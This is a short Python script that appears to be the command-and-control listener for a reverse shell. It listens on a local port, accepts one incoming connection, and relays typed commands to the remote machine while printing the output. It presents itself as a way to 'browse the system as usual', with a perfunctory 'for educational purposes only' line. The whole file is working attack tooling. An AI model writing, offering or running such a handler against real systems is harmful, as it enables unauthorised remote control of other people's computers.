import socket
import sys


def send_commands(s, conn):
    """ Get a command from user and send it to conn """
    print('\nCtrl-C to kill the connection.')
    print('Browse the system as usual.')
    print('For educational purposes only! :)\n')
    print('$ ', end='')
    while True:
        try:
            cmd = input()
            if len(cmd) > 0:
                conn.sendall(cmd.encode())
                data = conn.recv(1024)
                print(data.decode('utf-8'), end='')
        except KeyboardInterrupt:
            print('\nGood bye.\n')
            conn.close()
            s.close()
            sys.exit()
        except Exception as e:
            print(e)
            conn.close()
            s.close()
            sys.exit()


def server(address):
    """ Initializing server. Address should be tuple (host, port) """
    try:
        s = socket.socket()
        s.bind(address)
        s.listen()
        print('\nServer Inintialized.\nListening . . .\n')
    except Exception as e:
        print('\nSome error occured\n')
        print(e)
        restart = input('[?] Do you want to reinitialize server? (y/n) ')
        if restart == 'y' or restart == 'yes':
            print('\nReinitializing server. . .\n')
            server(address)
        else:
            print('\nThanks for using and good luck.\n')
            sys.exit()
    
    conn, addr = s.accept()
    print(f'Connection established: {addr}')
    send_commands(s, conn)


if __name__ == '__main__':
    host = 'localhost'
    port = 4554
    server((host, port))
